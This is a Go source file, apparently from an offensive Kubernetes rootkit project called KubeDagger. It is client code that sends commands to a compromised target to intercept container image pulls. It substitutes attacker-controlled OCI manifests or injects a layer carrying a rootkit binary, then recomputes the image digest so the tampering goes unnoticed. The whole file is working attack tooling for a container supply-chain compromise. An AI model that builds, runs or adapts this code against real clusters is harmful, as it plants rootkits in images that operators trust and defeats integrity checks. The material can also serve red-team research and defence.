package supply_chain

import (
	"encoding/json"
	"fmt"
	"os"

	"github.com/yasindce1998/KubeDagger/cmd/kubedagger-client/run/shared"
)

type InjectResult struct {
	Actions []shared.ActionInfo `json:"actions"`
	Success bool                `json:"success"`
}

func Execute(target, mode, targetImage, payload, output string) error {
	result := &InjectResult{}

	var actions []struct {
		name   string
		detail string
		cmd    string
	}

	switch mode {
	case "manifest-replace":
		actions = []struct {
			name   string
			detail string
			cmd    string
		}{
			{"intercept_pull", "hook container runtime image pull to intercept manifest fetch", "supply_intercept_pull"},
			{"replace_manifest", "substitute OCI manifest with attacker-controlled version", "supply_replace_manifest"},
			{"inject_layer", "add malicious layer containing rootkit binary to image", "supply_inject_layer"},
			{"update_digest", "recalculate and update image digest to match modified content", "supply_update_digest"},
		}
	default: // layer-inject
		actions = []struct {
			name   string
			detail string
			cmd    string
		}{
			{"intercept_pull", "hook container runtime image pull to intercept layer download", "supply_intercept_pull"},
			{"craft_layer", "create OCI layer tarball with payload at target path", "supply_craft_layer"},
			{"inject_layer", "append crafted layer to image during pull operation", "supply_inject_layer"},
			{"update_config", "update image config to include new layer in rootfs diff_ids", "supply_update_config"},
		}
	}

	for _, a := range actions {
		cmd := a.cmd + "#" + mode + "#" + targetImage + "#" + payload
		status := shared.SendCommand(target, "/supply_chain", cmd)
		result.Actions = append(result.Actions, shared.ActionInfo{
			Name:   a.name,
			Status: status,
			Detail: a.detail,
		})
	}

	result.Success = shared.AllSucceeded(result.Actions)

	data, _ := json.MarshalIndent(result, "", "  ")
	if output != "" {
		return os.WriteFile(output, data, 0644)
	}
	fmt.Println(string(data))
	return nil
}
